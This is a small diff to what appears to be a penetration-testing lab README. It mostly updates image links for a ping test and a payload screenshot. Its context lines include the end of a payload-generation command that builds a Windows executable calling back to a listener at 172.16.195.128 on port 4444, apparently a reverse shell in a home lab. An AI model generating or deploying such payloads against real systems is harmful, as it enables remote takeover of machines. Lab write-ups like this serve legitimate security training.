@@ -58,7 +58,6 @@ Connectivity Test:
 ```bash
 ping 172.16.195.129
 ```
-<img width="1440" height="672" alt="_ping_test" src="https://github.com/user-attachments/assets/8fdd7799-7e54-413f-b615-316580c5fe71" />
 
 ![Ping Test](_ping_test.png)
 
@@ -72,7 +71,7 @@ LHOST=172.16.195.128 LPORT=4444 \
 -f exe -o test_lab.exe
 ```
 
-![Payload](images/7_payload.png)
+![Payload](_payload.png)
 
 ---
 
